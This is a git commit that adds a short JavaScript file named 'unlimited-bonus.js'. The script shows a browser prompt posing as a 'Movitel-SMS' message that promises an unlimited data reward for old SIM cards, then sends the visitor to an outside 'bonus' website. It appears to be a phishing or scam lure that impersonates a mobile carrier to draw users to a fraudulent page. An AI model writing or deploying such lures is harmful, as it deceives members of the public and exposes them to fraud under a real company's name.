2709d9918c1bd4d4eeddae75525160ae5f82b029
opayoffer <154964955+opayoffer@users.noreply.github.com>
2024-05-25 23:16:35 -0700

    Create unlimited-bonus.js

---
+++ unlimited-bonus.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('Movitel-SMS: Dear client, kindly check if your sim card is qualify for Movitel old sim card Unlimited data Reward, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://2024-bonus.xyz/unlimited-offer.html';
+}
